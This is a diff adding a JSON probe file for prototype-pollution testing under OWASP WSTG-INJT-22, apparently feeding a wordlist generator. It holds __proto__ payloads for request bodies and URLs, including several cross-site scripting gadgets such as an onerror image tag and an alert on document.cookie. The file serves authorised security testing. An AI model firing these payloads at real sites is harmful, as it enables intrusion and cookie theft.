@@ -1,0 +1,41 @@
+{
+  "_meta": {
+    "description": "Prototype Pollution probe set for WSTG-INJT-22. protopoll_wordlists.py reads this and writes one wordlist per key below. Edit freely - the script just serializes whatever is here.",
+    "Body_Data": "JSON request bodies. Each entry is a JSON object, written to Body_Data.txt as one compact JSON line per entry.",
+    "URL_Hash": "Fragment (#...) query-string pollution strings, written verbatim to URL_Hash.txt, one per line.",
+    "URL_Seg": "Query-string (?...) pollution strings, written verbatim to URL_Seg.txt, one per line."
+  },
+  "Body_Data": [
+    { "__proto__": { "status": 510 } },
+    { "__proto__": { "json spaces": 10 } },
+    { "__proto__": { "parameterLimit": 1 } },
+    { "__proto__": { "allowDots": true } },
+    { "__proto__": { "exposedHeaders": ["x-pwned"] } }
+  ],
+  "URL_Hash": [
+    "#__proto__[polluted]=yes",
+    "#__proto__[transport_url]=data:,alert(1);",
+    "#__proto__[hitCallback]=alert(document.cookie)",
+    "#__proto__[innerHTML]=<img/src/onerror=alert(1)>",
+    "#__proto__[src]=data:,alert(1);",
+    "#__proto__[url]=data:,alert(1);",
+    "#__proto__[sequence]=alert(1)",
+    "#__proto__[toString]=polluted",
+    "#__proto__[json spaces]=10",
+    "#__proto__[status]=510",
+    "#__proto__[allowDots]=true",
+    "#__proto__[parameterLimit]=1",
+    "#__proto__[ignoreQueryPrefix]=true",
+    "#__proto__[exposedHeaders][]=x-pwned"
+  ],
+  "URL_Seg": [
+    "?__proto__[status]=510",
+    "?__proto__[json spaces]=10",
+    "?__proto__[allowDots]=true",
+    "?__proto__[parameterLimit]=1",
+    "?__proto__[ignoreQueryPrefix]=true",
+    "?__proto__[exposedHeaders][]=x-pwned",
+    "?__proto__[head]=false",
+    "?__proto__[polluted]=yes"
+  ]
+}
